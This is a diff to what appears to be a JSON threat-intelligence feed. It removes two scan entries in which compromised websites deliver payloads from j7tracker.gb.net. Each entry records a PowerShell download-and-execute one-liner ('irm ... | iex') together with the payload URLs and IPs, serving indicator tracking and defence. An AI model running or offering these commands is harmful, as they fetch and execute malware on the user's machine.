@@ -6696,43 +6696,5 @@
     ],
     "ReportId": "cmwoszyyl20zt0oml3emqnbu6",
     "ScannedAt": "2026-11-20T09:55:40.401000+00:00"
-  },
-  {
-    "UrlDomain": "hackandslashgames.com",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/ef9c80bd652ab34d"
-    ],
-    "IP": [
-      "162.159.135.42"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/ef9c80bd652ab34d')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/ef9c80bd652ab34d"
-    ],
-    "ReportId": "cmwooi70420ts0omlj0pbm2lo",
-    "ScannedAt": "2026-11-20T07:49:52.529000+00:00"
-  },
-  {
-    "UrlDomain": "liajoffe.com",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/38ade94b3e931d9d"
-    ],
-    "IP": [
-      "162.241.144.19"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/38ade94b3e931d9d')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/38ade94b3e931d9d"
-    ],
-    "ReportId": "cmwooi4ba20ti0omludc2kosv",
-    "ScannedAt": "2026-11-20T07:49:49.061000+00:00"
   }
 ]
